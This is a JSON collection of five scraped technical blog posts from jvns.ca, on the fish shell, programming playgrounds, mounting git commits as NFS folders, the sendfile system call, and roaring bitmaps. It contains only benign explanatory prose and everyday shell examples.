[
{"url": "https://jvns.ca/blog/2024/09/12/reasons-i--still--love-fish/", "title": "Reasons I still love the fish shell", "content": "\n     \n\n I wrote about how much I love  fish  in  this blog post from 2017  and, 7 years\nof using it every day later, I’ve found even more reasons to love it. So I\nthought I’d write a new post with both the old reasons I loved it and some\nreasons. \n\n This came up today because I was trying to figure out why my terminal doesn’t\nbreak anymore when I cat a binary to my terminal, the answer was “fish fixes\nthe terminal!“, and I just thought that was really nice. \n\n 1. no configuration \n\n In 10 years of using fish I have never found a single thing I wanted to configure. It just works the way I want. My fish config file just has: \n\n \n environment variables \n aliases ( alias ls eza ,  alias vim nvim , etc) \n the occasional  direnv hook fish | source  to integrate a tool like direnv \n a script I run to set up my  terminal colours \n \n\n I’ve been told that configuring things in fish is really easy if you ever do\nwant to configure something though. \n\n 2. autosuggestions from my shell history \n\n My absolute favourite thing about fish is that I type, it’ll automatically\nsuggest (in light grey) a matching command that I ran recently. I can press the\nright arrow key to accept the completion, or keep typing to ignore it. \n\n Here’s what that looks like. In this example I just typed the “v” key and it\nguessed that I want to run the previous vim command again. \n\n \n\n 2.5 “smart” shell autosuggestions \n\n One of my favourite subtle autocomplete features is how fish handles autocompleting commands that contain paths in them. For example, if I run: \n\n $ ls blah.txt\n \n\n that command will only be autocompleted in directories that contain  blah.txt  – it won’t show up in a different directory. (here’s  a short comment about how it works ) \n\n As an example, if in this directory I type  bash scripts/ , it’ll only suggest\nhistory commands including files that  actually exist  in my blog’s scripts\nfolder, and not the dozens of other irrelevant  scripts/  commands I’ve run in\nother folders. \n\n I didn’t understand exactly how this worked until last week, it just felt like fish was\nmagically able to suggest the right commands. It still feels a little like magic and I love it. \n\n 3. pasting multiline commands \n\n If I copy and paste multiple lines, bash will run them all, like this: \n\n [bork@grapefruit linux-playground (main)]$ echo hi\nhi\n[bork@grapefruit linux-playground (main)]$ touch blah\n[bork@grapefruit linux-playground (main)]$ echo hi\nhi\n \n\n This is a bit alarming – what if I didn’t actually  want  to run all those\ncommands? \n\n Fish will paste them all at a single prompt, so that I can press Enter if I\nactually want to run them. Much less scary. \n\n bork@grapefruit ~/work/> echo hi\n\n                         touch blah\n                         echo hi\n \n\n 4. nice tab completion \n\n If I run  ls  and press tab, it’ll display all the filenames in a nice grid. I can use either Tab, Shift+Tab, or the arrow keys to navigate the grid. \n\n Also, I can tab complete from the  middle  of a filename – if the filename\nstarts with a weird character (or if it’s just not very unique), I can type\nsome characters from the middle and press tab. \n\n Here’s what the tab completion looks like: \n\n bork@grapefruit ~/work/> ls \napi/  blah.py     fly.toml   README.md\nblah  Dockerfile  frontend/  test_websocket.sh\n \n\n I honestly don’t complete things other than filenames very much so I can’t\nspeak to that, but I’ve found the experience of tab completing filenames to be\nvery good. \n\n 5. nice default prompt (including git integration) \n\n Fish’s default prompt includes everything I want: \n\n \n username \n hostname \n current folder \n git integration \n status of last command exit (if the last command failed) \n \n\n Here’s a screenshot with a few different variations on the default prompt,\nincluding if the last command was interrupted (the  SIGINT ) or failed. \n\n \n\n 6. nice history defaults \n\n In bash, the maximum history size is 500 by default, presumably because\ncomputers used to be slow and not have a lot of disk space. Also, by default,\ncommands don’t get added to your history until you end your session. So if your\ncomputer crashes, you lose some history. \n\n In fish: \n\n \n the default history size is 256,000 commands. I don’t see any reason I’d ever need more. \n if you open a new tab, everything you’ve ever run (including commands in\nopen sessions) is immediately available to you \n in an existing session, the history search will only include commands from\nthe current session, plus everything that was in history at the time that\nyou started the shell \n \n\n I’m not sure how clearly I’m explaining how fish’s history system works here,\nbut it feels really good to me in practice. My impression is that the way it’s\nimplemented is the commands are continually added to the history file, but fish\nonly loads the history file once, on startup. \n\n I’ll mention here that if you want to have a fancier history system in another\nshell it might be worth checking out  atuin  or  fzf . \n\n 7. press up arrow to search history \n\n I also like fish’s interface for searching history: for example if I want to\nedit my fish config file, I can just type: \n\n $ config.fish\n \n\n and then press the up arrow to go back the last command that included  config.fish . That’ll complete to: \n\n $ vim ~/.config/fish/config.fish\n \n\n and I’m done. This isn’t  so  different from using  Ctrl+R  in bash to search\nyour history but I think I like it a little better over all, maybe because\n Ctrl+R  has some behaviours that I find confusing (for example you can\nend up accidentally editing your history which I don’t like). \n\n 8. the terminal doesn’t break \n\n I used to run into issues with bash where I’d accidentally  cat  a binary to\nthe terminal, and it would break the terminal. \n\n Every time fish displays a prompt, it’ll try to fix up your terminal so that\nyou don’t end up in weird situations like this. I think  this is some of the\ncode in fish to prevent broken terminals . \n\n Some things that it does are: \n\n \n turn on  echo  so that you can see the characters you type \n make sure that newlines work properly so that you don’t get that weird staircase effect \n reset your terminal background colour, etc \n \n\n I don’t think I’ve run into any of these “my terminal is broken” issues in a\nvery long time, and I actually didn’t even realize that this was because of\nfish – I thought that things somehow magically just got better, or maybe I\nwasn’t making as many mistakes. But I think it was mostly fish saving me from\nmyself, and I really appreciate that. \n\n 9. Ctrl+S is disabled \n\n Also related to terminals breaking: fish disables Ctrl+S (which freezes your\nterminal and then you need to remember to press Ctrl+Q to unfreeze it). It’s a\nfeature that I’ve never wanted and I’m happy to not have it. \n\n Apparently you can disable  Ctrl+S  in other shells with  stty -ixon . \n\n 10.  fish_add_path \n\n I have mixed feelings about this one, but in Fish you can use  fish_add_path\n/opt/whatever/bin  to add a path to your PATH, globally, permanently, across\nall open shell sessions. This can get a bit confusing if you forget where\nthose PATH entries are configured but overall I think I appreciate it. \n\n 11. nice syntax highlighting \n\n By default commands that don’t exist are highlighted in red, like this. \n\n \n\n 12. easier loops \n\n I find the loop syntax in fish a lot easier to type than the bash syntax. It looks like this: \n\n for i in *.yaml\n  echo $i\nend\n \n\n Also it’ll add indentation in your loops which is nice. \n\n 13. easier multiline editing \n\n Related to loops: you can edit multiline commands much more easily than in bash\n(just use the arrow keys to navigate the multiline command!). Also when you use\nthe up arrow to get a multiline command from your history, it’ll show you the\nwhole command the exact same way you typed it instead of squishing it all onto\none line like bash does: \n\n $ bash\n$ for i in *.png\n> do\n> echo $i\n> done\n$ # press up arrow\n$ for i in *.png; do echo $i; done ink\n \n\n 14. Ctrl+left arrow \n\n This might just be me, but I really appreciate that fish has the  Ctrl+left\narrow  /  Ctrl+right arrow  keyboard shortcut for moving between\nwords when writing a command. \n\n I’m honestly a bit confused about where this keyboard shortcut is coming from\n(the only documented keyboard shortcut for this I can find in fish is  Alt+left\narrow  /  Alt + right arrow  which seems to do the same thing), but I’m pretty\nsure this is a fish shortcut. \n\n A couple of notes about getting this shortcut to work / where it comes from: \n\n \n one person said they needed to switch their terminal emulator from the “Linux\nconsole” keybindings to “Default (XFree 4)” to get it to work in fish \n on Mac OS,  Ctrl+left arrow  switches workspaces by default, so I had to turn\nthat off. \n Also apparently Ubuntu configures libreadline in  /etc/inputrc  to make\n Ctrl+left/right arrow  go back/forward a word, so it’ll work in bash on\nUbuntu and maybe other Linux distros too. Here’s a  stack overflow question talking about that \n \n\n a downside: not everything has a fish integration \n\n Sometimes tools don’t have instructions for integrating them with fish. That’s annoying, but: \n\n \n I’ve found this has gotten better over the last 10 years as fish has gotten\nmore popular. For example Python’s virtualenv has had a fish integration for\na long time now. \n If I need to run a POSIX shell command real quick, I can always just run  bash  or  zsh \n I’ve gotten much better over the years at translating simple commands to fish syntax when I need to \n \n\n My biggest day-to-day to annoyance is probably that for whatever reason I’m\nstill not  used to fish’s syntax for setting environment variables, I get confused\nabout  set  vs  set -x . \n\n on POSIX compatibility \n\n When I started using fish, you couldn’t do things like  cmd1 && cmd2  – it\nwould complain “no, you need to run  cmd1; and cmd2 ” instead. \n\n It seems like over the years fish has started accepting a little more POSIX-style syntax than it used to, like: \n\n \n cmd1 && cmd2 \n export a=b  to set an environment variable (though this seems a bit limited, you can’t do  export PATH=$PATH:/whatever  so I think it’s probably better to learn  set  instead) \n \n\n on fish as a default shell \n\n Changing my default shell to fish is always a little annoying, I occasionally get myself into a situation where \n\n \n I install fish somewhere like maybe  /home/bork/.nix-stuff/bin/fish \n I add the new fish location to  /etc/shells  as an allowed shell \n I change my shell with  chsh \n at some point months/years later I reinstall fish in a different location for some reason and remove the old one \n oh no!!! I have no valid shell! I can’t open a new terminal tab anymore! \n \n\n This has never been a major issue because I always have a terminal open\nsomewhere where I can fix the problem and rescue myself, but it’s a bit\nalarming. \n\n If you don’t want to use  chsh  to change your shell to fish (which is very reasonable,\nmaybe I shouldn’t be doing that), the  Arch wiki page  has a couple of good suggestions –\neither configure your terminal emulator to run fish or add an  exec fish  to\nyour  .bashrc . \n\n I’ve never really learned the scripting language \n\n Other than occasionally writing a for loop interactively on the command line,\nI’ve never really learned the fish scripting language. I still do all of my\nshell scripting in bash. \n\n I don’t think I’ve ever written a fish function or  if  statement. \n\n it seems like fish is getting pretty popular \n\n I ran a highly unscientific poll on Mastodon asking people what shell they  use interactively . The results were (of 2600 responses): \n\n \n 46% bash \n 49% zsh \n 16% fish \n 5% other \n \n\n I think 16% for fish is pretty remarkable, since (as far as I know) there isn’t\nany system where fish is the default shell, and my sense is that it’s very\ncommon to just stick to whatever your system’s default shell is. \n\n It feels like a big achievement for the fish project, even if maybe my Mastodon\nfollowers are more likely than the average shell user to use fish for some\nreason. \n\n who might fish be right for? \n\n Fish definitely isn’t for everyone. I think I like it because: \n\n \n I really dislike configuring my shell (and honestly my dev environment in general), I want things to “just work” with the default settings \n fish’s defaults feel good to me \n I don’t spend that much time logged into random servers using other shells\nso there’s not too much context switching \n I liked its features so much that I was willing to relearn how to do a few\n“basic” shell things, like using parentheses  (seq 1 10)  to run a command\ninstead of backticks or using  set  instead of  export \n \n\n Maybe you’re also a person who would like fish! I hope a few more of the people\nwho fish is for can find it, because I spend so much of my time in the terminal\nand it’s made that time much more pleasant. \n\n"},
{"url": "https://jvns.ca/blog/2023/04/17/a-list-of-programming-playgrounds/", "title": "A list of programming playgrounds", "content": "\n     \n\n I really like using (and making!) programming playgrounds, and I got thinking\nthe other day about how I didn’t have a great list of playgrounds to refer to. So I\n asked on Mastodon \nfor links to cool playgrounds. \n\n Here’s what I came up with. I’d love to know what I missed. \n\n \n Compilers:  godbolt compiler explorer  by Matt Godbolt \n Shaders:  shadertoy  by Inigo Quilez and Pol Jeremias \n Arduino / IoT:  wokwi  from CodeMagic \n CSS/HTML/JS:  CodePen  by Chris Coyier, Alex Vasquez, and team \n CSS/HTML/JS:  JSFiddle  by Oskar Krawczyk and Piotr Zalewa \n CSS/HTML/JS:  flems  by Rasmus Porsager (saves all state in the URL) \n regular expressions:\n\n \n for many languages:  regex101  by Firas Dib \n for Ruby:  Rubular  by Michael Lovitt \n for JS/PCRE:  regexr  by gskinner \n for Python:  Pythex  by Gabriel Rodríguez \n \n DNS:  Mess With DNS  by Julia Evans and Marie Flanagan \n DNS:  DNS lookup tool  by Julia Evans \n nginx:  nginx playground  by Julia Evans \n varnish:  fastly fiddle  from fastly \n SQLite:  sqlime  by Anton Zhiyanov (lets you load arbitrary SQLite databases) \n SQL:  DB fiddle  from Status200 \n SQL:  sql playground  by Julia Evans \n Postgres:  postgres playground  from Crunchydata (runs postgres in the browser!) \n Git:  oh my git  by blinry and bleeptrack \n .NET bytecode:  SharpLab  by Andrey Shchekin \n Python bytecode:  dis this  by Pamela Fox \n \n\n data formats \n\n \n Floating point:  Float Exposed  by Bartosz Ciechanowski \n Unicode:  Unicode analyzer  from fontspace \n Unicode:  What unicode character is this?  from babelstone \n ASN.1 certificates:  ASN.1 JavaScript debugger  by Lapo Luchini \n SVG:  sssvg (interactive SVG reference)  from  fffuel  (lots of other cool tools there) \n CBOR:  CBOR playground \n JSON:  JSON editor online  by Jos de Jong \n cron:  crontab guru  from cronitor \n \n\n programming languages \n\n \n official playgrounds:\n\n \n Go \n Rust \n Ruby \n Typescript \n Haskell ,  C# ,  Elm ,  Kotlin ,  Scala ,  OCaml ,  Crystal ,  Svelte \n \n unofficial playgrounds:\n\n \n PHP:  3v4l  by Sjon Hortensius \n Python/JS/C/C++/Java:  Python Tutor  by Philip Guo \n Javascript:  JS Console  by @rem \n many languages:  riju  by Radon Rosborough \n many languages:  replit \n others:  jqplay  for jq,  tryapl  for APL \n \n \n\n"},
{"url": "https://jvns.ca/blog/2023/12/04/mounting-git-commits-as-folders-with-nfs/", "title": "Mounting git commits as folders with NFS", "content": "\n     \n\n Hello! The other day, I started wondering – has anyone ever made a FUSE\nfilesystem for a git repository where all every commit is a folder? It turns\nout the answer is yes! There’s  giblefs ,\n GitMounter , and  git9  for Plan 9. \n\n But FUSE is pretty annoying to use on Mac – you need to install a kernel\nextension, and Mac OS seems to be making it harder and harder to install kernel\nextensions for security reasons. Also I had a few ideas for how to organize the\nfilesystem differently than those projects. \n\n So I thought it would be fun to experiment with ways to mount filesystems on\nMac OS other than FUSE, so I built a project that does that called\n git-commit-folders . It works (at least on my computer) with both FUSE and NFS, and there’s a broken WebDav\nimplementation too. \n\n It’s pretty experimental (I’m not sure if this is actually a useful piece of\nsoftware to have or just a fun toy to think about how git works) but it was fun\nto write and I’ve enjoyed using it myself on small repositories so here are\nsome of the problems I ran into while writing it. \n\n goal: show how commits are like folders \n\n The main reason I wanted to make this was to give folks some intuition for how\ngit works under the hood. After all, git commits really  are  very similar to\nfolders – every Git commit  contains a directory listing  of the files in it,\nand that directory can have subdirectories, etc. \n\n It’s just that git commits aren’t  actually  implemented as folders to save\ndisk space. \n\n So in  git-commit-folders , every commit is actually a folder, and if you want\nto explore your old commits, you can do it just by exploring the filesystem!\nFor example, if I look at the initial commit for my blog, it looks like this: \n\n $ ls commits/8d/8dc0/8dc0cb0b4b0de3c6f40674198cb2bd44aeee9b86/\nREADME\n \n\n and a few commits later, it looks like this: \n\n $ ls /tmp/git-homepage/commits/c9/c94e/c94e6f531d02e658d96a3b6255bbf424367765e9/\n_config.yml  config.rb  Rakefile  rubypants.rb  source\n \n\n branches are symlinks \n\n In the filesystem mounted by  git-commit-folders , commits are the only real folders – everything\nelse (branches, tags, etc) is a symlink to a commit. This mirrors how git works under the hood. \n\n $ ls -l branches/\nlr-xr-xr-x 59 bork bazil-fuse -> ../commits/ff/ff56/ff563b089f9d952cd21ac4d68d8f13c94183dcd8\nlr-xr-xr-x 59 bork follow-symlink -> ../commits/7f/7f73/7f73779a8ff79a2a1e21553c6c9cd5d195f33030\nlr-xr-xr-x 59 bork go-mod-branch -> ../commits/91/912d/912da3150d9cfa74523b42fae028bbb320b6804f\nlr-xr-xr-x 59 bork mac-version -> ../commits/30/3008/30082dcd702b59435f71969cf453828f60753e67\nlr-xr-xr-x 59 bork mac-version-debugging -> ../commits/18/18c0/18c0db074ec9b70cb7a28ad9d3f9850082129ce0\nlr-xr-xr-x 59 bork main -> ../commits/04/043e/043e90debbeb0fc6b4e28cf8776e874aa5b6e673\n$ ls -l tags/\nlr-xr-xr-x - bork 31 Dec  1969 test-tag -> ../commits/16/16a3/16a3d776dc163aa8286fb89fde51183ed90c71d0\n \n\n This definitely doesn’t completely explain how git works (there’s a lot more to\nit than just “a commit is like a folder!”), but my hope is that it makes thie\nidea that every commit is like a folder with an old version of your code” feel\na little more concrete. \n\n why might this be useful? \n\n Before I get into the implementation, I want to talk about why having a filesystem\nwith a folder for every git commit in it might be useful. A lot of my projects\nI end up never really using at all (like  dnspeep ) but I did find myself using this\nproject a little bit while I was working on it. \n\n The main uses I’ve found so far are: \n\n \n searching for a function I deleted – I can run  grep someFunction branch_histories/main/*/commit.go  to find an old version of it \n quickly looking at a file on another branch to copy a line from it, like  vim branches/other-branch/go.mod \n searching every branch for a function, like  grep someFunction branches/*/commit.go \n \n\n All of these are through symlinks to commits instead of referencing commits\ndirectly. \n\n None of these are the most efficient way to do this (you can use  git show  and\n git log -S  or maybe  git grep  to accomplish something similar), but\npersonally I always forget the syntax and navigating a filesystem feels easier\nto me.  git worktree  also lets you have multiple branches checked out at the same\ntime, but to me it feels weird to set up an entire worktree just to look at 1\nfile. \n\n Next I want to talk about some problems I ran into. \n\n problem 1: webdav or NFS? \n\n The two filesystems I could that were natively supported by Mac OS were WebDav\nand NFS. I couldn’t tell which would be easier to implement so I just\ntried both. \n\n At first webdav seemed easier and it turns out that golang.org/x/net has a\n webdav implementation , which  was\npretty easy to set up. \n\n But that implementation doesn’t support symlinks, I think because it uses the  io/fs  interface\nand  io/fs  doesn’t  support symlinks yet . Looks like that’s in progress\nthough. So I gave up on webdav and decided to focus on the NFS implementation, using this  go-nfs  NFSv3 library. \n\n Someone also mentioned that there’s\n FileProvider  on Mac\nbut I didn’t look into that. \n\n problem 2: how to keep all the implementations in sync? \n\n I was implementing 3 different filesystems (FUSE, NFS, and WebDav), and it\nwasn’t clear to me how to avoid a lot of duplicated code. \n\n My friend Dave suggested writing one core implementation and then writing\nadapters (like  fuse2nfs  and  fuse2dav ) to translate it into the NFS and\nWebDav verions. What this looked like in practice is that I needed to implement\n3 filesystem interfaces: \n\n \n fs.FS  for FUSE \n billy.Filesystem  for NFS \n webdav.Filesystem  for webdav \n \n\n So I put all the core logic in the  fs.FS  interface, and then wrote two functions: \n\n \n func Fuse2Dav(fs fs.FS) webdav.FileSystem \n func Fuse2NFS(fs fs.FS) billy.Filesystem \n \n\n All of the filesystems were kind of similar so the translation wasn’t too hard,\nthere were just 1 million annoying bugs to fix. \n\n problem 3: I didn’t want to list every commit \n\n Some git repositories have thousands or millions of commits. My first idea for how to address this was to make  commits/  appear empty, so that it works like this: \n\n $ ls commits/\n$ ls commits/80210c25a86f75440110e4bc280e388b2c098fbd/\nfuse  fuse2nfs  go.mod  go.sum  main.go  README.md\n \n\n So every commit would be available if you reference it directly, but you can’t\nlist them. This is a weird thing for a filesystem to do but it actually works\nfine in FUSE. I couldn’t get it to work in NFS though. I assume what’s going on\nhere is that if you tell NFS that a directory is empty, it’ll interpret that\nthe directory is actually empty, which is fair. \n\n I ended up handling this by: \n\n \n organizing the commits by their 2-character prefix the way  .git/objects \ndoes (so that  ls commits  shows  0b 03 05 06 07 09 1b 1e 3e 4a ), but doing\n2 levels of this so that a  18d46e76d7c2eedd8577fae67e3f1d4db25018b0  is at  commits/18/18df/18d46e76d7c2eedd8577fae67e3f1d4db25018b0 \n listing all the packed commits hashes only once at the beginning, caching\nthem in memory, and then only updating the loose objects afterwards. The idea\nis that almost all of the commits in the repo should be packed and git\ndoesn’t repack its commits very often. \n \n\n This seems to work okay on the Linux kernel which has ~1 million commits. It\ntakes maybe a minute to do the initial load on my machine and then after that\nit just needs to do fast incremental updates. \n\n Each commit hash is only 20 bytes so caching 1 million commit hashes isn’t a\nbig deal, it’s just 20MB. \n\n I think a smarter way to do this would be to load the commit listings lazily –\nGit sorts its packfiles by commit ID, so you can pretty easily do a binary\nsearch to find all commits starting with  1b  or  1b8c . The  git library  I was using\ndoesn’t have great support for this though, because listing all commits in a\nGit repository is a really weird thing to do. I spent maybe a couple of days\n trying to implement it  but I didn’t manage to get the performance I wanted so I\ngave up. \n\n problem 4: “not a directory” \n\n I kept getting this error: \n\n \"/tmp/mnt2/commits/59/59167d7d09fd7a1d64aa1d5be73bc484f6621894/\": Not a directory (os error 20)\n \n\n This really threw me off at first but it turns out that this just means that\nthere was an error while listing the directory, and the way the NFS library\nhandles that error is with “Not a directory”. This happened a bunch of times\nand I just needed to track the bug down every time. \n\n There were a lot of weird errors like this. I also got  cd: system call\ninterrupted  which was pretty upsetting but ultimately was just some other bug\nin my program. \n\n Eventually I realized that I could use Wireshark to look at all the NFS\npackets being sent back and forth, which made some of this stuff easier to debug. \n\n problem 5: inode numbers \n\n At first I was accidentally setting all my directory inode numbers to 0. This\nwas bad because if if you run  find  on a directory where the inode number of\nevery directory is 0, it’ll complain about filesystem loops and give up, which\nis very fair. \n\n I fixed this by defining an  inode(string)  function which hashed a string to\nget the inode number, and using the tree ID / blob ID as the string to hash. \n\n problem 6: stale file handles \n\n I kept getting this “Stale NFS file handle” error. The problem is that I need\nto be able to take an opaque 64-byte NFS “file handle” and map it to the right\ndirectory. \n\n The way the NFS library I’m using works is that it generates a file handle for\nevery file and caches those references with a fixed size cache. This works fine\nfor small repositories, but if there are too many files then it’ll overflow the\ncache and you’ll start getting stale file handle errors. \n\n This is still a problem and I’m not sure how to fix it. I don’t understand how\nreal NFS servers do this, maybe they just have a really big cache? \n\n The NFS file handle is 64 bytes (64 bytes! not bits!) which is pretty big, so\nit does seem like you could just encode the entire file path in the handle a\nlot of the time and not cache it at all. Maybe I’ll try to implement that at\nsome point. \n\n problem 7: branch histories \n\n The  branch_histories/  directory only lists the latest 100 commits for each\nbranch right now. Not sure what the right move is there – it would be nice to\nbe able to list the full history of the branch somehow. Maybe I could use a\nsimilar subfolder trick to the  commits/  directory. \n\n problem 8: submodules \n\n Git repositories sometimes have submodules. I don’t understand anything about\nsubmodules so right now I’m just ignoring them. So that’s a bug. \n\n problem 9: is NFSv4 better? \n\n I built this with NFSv3 because the only Go library I could find at the time\nwas an NFSv3 library. After I was done I discovered that the buildbarn project\nhas an  NFSv4 server  in it. Would it be better to use that? \n\n I don’t know if this is actually a problem or how big of an advantage it would\nbe to use NFSv4. I’m also a little unsure about using the buildbarn NFS library\nbecause it’s not clear if they expect other people to use it or not. \n\n that’s all! \n\n There are probably more problems I forgot but that’s all I can think of for\nnow. I may or may not fix the NFS stale file handle problem or the “it takes 1\nminute to start up on the linux kernel” problem, who knows! \n\n Thanks to my friend  vasi  who explained one million things about filesystems to me. \n\n"},
{"url": "https://jvns.ca/blog/2016/01/23/sendfile-a-new-to-me-system-call/", "title": "Sendfile (a system call for web developers to know about!)", "content": "\n     \n\n The other day I learned about a new (to me) exciting Linux system call! (for newcomers, a system call is an operation you can ask the operating system to do). This one seems really important to know about if you’re configuring a webserver! So let’s learn about it. \n\n Before this, I knew about basic system calls like  open  and  read  for files, and  sendto  and  recvfrom  for networking. And a few fancier things like  futex  and  select  for mutexes and waiting. \n\n why sendfile was invented \n\n Suppose I want to send you a big file over a network connection. Normally I’d just read the file incrementally, and then write the contents to the socket. So, at a minimum, we need to \n\n \n use  read  (requires a context switch into kernel code) \n (implicitly, copy the data from kernel memory into user memory) \n use  sendto  or  write  (another context switch) \n \n\n This means we need to copy data (bad) and use two system calls instead of one (also bad). \n\n So the idea is – this pattern of reading a file and writing to a socket is really common! So they made a system call to just do that! Then the kernel can do all the work of reading and writing, and save you CPU time. And you don’t need to copy any data around! AMAZING. \n\n the performance implications \n\n I found this  google code discussion on a Python FTP library . One person says that by using the  sendfile  system call, they could transfer 1.5GB/s instead of 800MB/s! That’s pretty awesome for a small change. \n\n This paper from Netflix  describes using sendfile on FreeBSD to go from 6Gbps to 40Gbps of network throughput. They also talk about implementing (part of?) TLS in the kernel to improve TLS performance. \n\n the disasters \n\n I then read  “The brokenness of the sendfile() system call” . Wait?! But I thought sendfile was awesome and we should always use it? Not so! \n\n That post describes how on OS X,  sendfile  wouldn’t send  any  data until the socket was closed, causing up to 5 second delays. That’s TERRIBLE. So sendfile isn’t some kind of universal panacea, and that’s why webservers let you turn it on and off. \n\n some other reading on sendfile \n\n Rob Pike (one of the creators of Go) thinks sendfile is “bizarre” . I find his argument in that post pretty difficult to follow (if the kernel provides a way to do something, and that way gives you better performance in practice, why not use it?). But I thought it was interesting. \n\n Life of a HTTP request, as seen by my toy web server  is interesting, and describes how the author uses  sendfile  for large files, but not for small files. You don’t need to write your own webserver to take advantage of this – you can configure apache and nginx to use sendfile! \n\n The sendfile man page  is actually quite readable, and it tells you something very important! It recommends using the  TCP_CORK  TCP option for better network performance. We learned about how understanding TCP is important in  Why you should understand (a little) about TCP , and that’s pretty important here as well. In this case you need to decide whether to use  TCP_CORK  and  TCP_NODELAY . One thing I read recommended using both. \n\n You can also use sendfile to copy files quickly! (like, think about how  cp  is implemented!)  So you want to write to a file real fast…  walks through some optimizations to file copying and gets a 25% improvement by using  sendfile  and other tricks. I straced  cp  on my machine just now, and it seems like it does not use  sendfile . It’s super interesting to me how much abstractions break down when you’re trying to really optimize performance. \n\n next step:  splice  &  tee \n\n These days  sendfile  is a wrapper around the  splice  system call, which seems to be the same thing – copy data from one file/pipe/socket to another – but with some extra options. \n\n There’s  a neat thread on the Linux Kernel Mailing List from 2006 , just after those system calls came into existence, where Linus explains what they’re for and how to think about them. \n\n I found this paragraph helpful: \n\n \n Anyway, when would you actually  use  a kernel buffer? Normally you’d use it\nit you want to copy things from one source into another, and you don’t\nactually want to see the data you are copying, so using a kernel buffer allows\nyou to possibly do it more efficiently, and you can avoid allocating user VM\nspace for it \n \n\n That post also makes it clear that  sendfile  used to be a separate system call and is now just a wrapper around  splice . \n\n There’s also  vmsplice , which I think is related and important. But right now my brain is full. Maybe we’ll learn about vmsplice later. \n\n why this is amazing \n\n It makes me really happy when learning a new system call helps me understand how to do something really practical. Now I know that if I’m building something that serves large files and I care about the performance, I should make sure I understand if it’s using sendfile! \n\n"},
{"url": "https://jvns.ca/blog/2016/01/23/fast-integer-sets-with-roaring-bitmaps/", "title": "Fast integer sets with Roaring Bitmaps (and, making friends with your modern CPU)", "content": "\n     \n\n I went to the  Papers we Love Montreal meetup  this week where  Daniel Lemire  spoke about  roaring bitmaps , and it was AWESOME. \n\n I learned about a cool new data structure, why sets of integers are super important, how modern CPUs are different from they were in the 90s, and how we should maybe think about that when designing data structures. \n\n integer sets (TIL hash sets aren’t fast) \n\n The talk was about building integer sets (like  {1,28823,24,514} ) that let you do really really fast intersections & unions & other set operations. \n\n But why even care about integer sets? I was super confused about this at the beginning of the talk. \n\n Well, suppose you’re building a database! Then you need to run queries like  select * from people where name = 'julia' and country = 'canada' . This involves finding all the rows where  name = 'julia'  and where  country = 'canada'  and taking a set intersection! And the rows IDs are integers. \n\n You might have millions of rows in your database that match, so both the size of the set in memory and the speed of the set intersection are important! A fast integer set library here will really help you. \n\n One of the big takeaways for me in this talk was “whoa, hashsets are not fast. okay.” It turns out there are much much faster ways to represent large sets! \n\n bitmaps \n\n Here’s the basic story about how to make fast integer sets! \n\n To represent the set [0,1,2,5], you don’t need 4 integers! (128 bits) Instead, you can just store the bits  111001  (set the bit 5 to 1 to indicate that 5 is in the set!). That’s a “bitmap” or “bitset”, and it only uses 6 bits. AMAZING. \n\n Taking ‘AND’ or ‘OR’ of two bitmaps corresponds to set intersection or union, and is extremely wizard fast. Even faster than you might think! This is where the talk got really surprising to me, so we’re going to take a break and talk about CPUs for a while. \n\n modern CPUs and parallelization (but not the kind you think) \n\n I have this idea in my head that my CPU can do 2.7 billion instructions a second (that’s what 2.7 GHz means, right?). But I learned this is not actually really true! It does 2.7 billion  cycles  a second, but can potentially do way more instructions than that. Sometimes. \n\n Imagine two different programs. In the first one, you’re doing something dead-simple like taking the  AND  of a bunch of bits. In the second program, you have tons of branching, and what you do with the end of the data depends on what the beginning of the data is. \n\n The first one is definitely easier to parallelize! But usually when I hear people talk about parallelization, they mean splitting a computation across many CPU cores, or many computers. That’s not what this is about. \n\n This is about doing more than one instruction per CPU cycle, on a single core, in a single thread. I still don’t understand very much about modern CPU architecture ( Dan Luu  writes cool blog posts about that, though). Let’s see a short experiment with that in action. \n\n some CPU cycle math \n\n In  Computers are fast , we looked at summing the bytes in a file as fast as possible. What’s up with our CPU cycles, though? We can find out with  perf stat : \n\n $ perf stat ./bytesum_intrinsics The\\ Newsroom\\ S01E04.mp4\n Performance counter stats for './bytesum_intrinsics The Newsroom S01E04.mp4':\n\n       783,592,910 cycles                    #    2.735 GHz                    \n       472,822,242 stalled-cycles-frontend   #   60.34% frontend cycles idle   \n     1,126,180,100 instructions              #    1.44  insns per cycle        \n            31,039 branch-misses             #    0.02% of all branches        \n\n       0.288103005 seconds time elapsed\n\n \n\n My laptop’s clock speed is 2.735 GHz. That means in 0.288103 seconds it has time for about 780,000,000 cycles (do the math! it checks out.) Not-coincidentally, that’s exactly how many cycles perf reports the program using. But cycles are not instructions!! My understanding of modern CPUs is – old CPUs used to do only one instruction per cycle, and it was easy to reason about. New CPU have “instruction pipelines” and can do LOTS. I don’t actually know what the limit is. \n\n For this program, it’s doing 1.4 instructions per cycle. I have no idea if that’s good, or why. If I look at  perf stat ls , it does 0.6 instructions per cycle. That’s more than 2x less! In the talk, Lemire said that you can get up to an 8x speed increase by doing more instructions per cycle! \n\n Here’s the disassembly of  bytesum_intrinsics , and which instructions it spends the most time on (the numbers on the right are percentages).  Dan Luu  would probably be able to interpret this and tell me what’s going on, but I don’t know how. \n\n \n\n Roaring Bitmaps: a library for compressed bitmaps \n\n Okay, back to bitmaps! \n\n If you want to represent the set {0,1,100000000} with a bitmap, then you have a problem. You don’t want to use 100000000 bits to represent 3 elements. So compression of bitmaps is a big deal. The Roaring Bitmap library gives you a data structure and a bunch of algorithms to take the intersection and union of compressed bitmaps fast. He said they can usually use 2-3 bits per integer they store?! I’m not going to explain how it works at all – read  roaringbitmap.org  or  the github repository’s README  if you want to know more. \n\n modern CPUs & roaring bitmaps \n\n What does all this talk of CPUs have to do with bitmaps, though? \n\n Basically they designed the roaring bitmaps data structure so that the CPU can do less instructions (using single-instruction-multiple-data/SIMD instructions that let you operate on 128 bits at a time) and then additionally do lots of instructions per cycle (good parallelization!). I thought this was super awesome. \n\n He showed a lot of really great benchmark results, and I felt pretty convinced that this is a good library. \n\n The whole goal of the Papers We Love meetup is to show programmers work academics are doing that can actually help them write programs. This was a fantastic example of that. \n\n"},
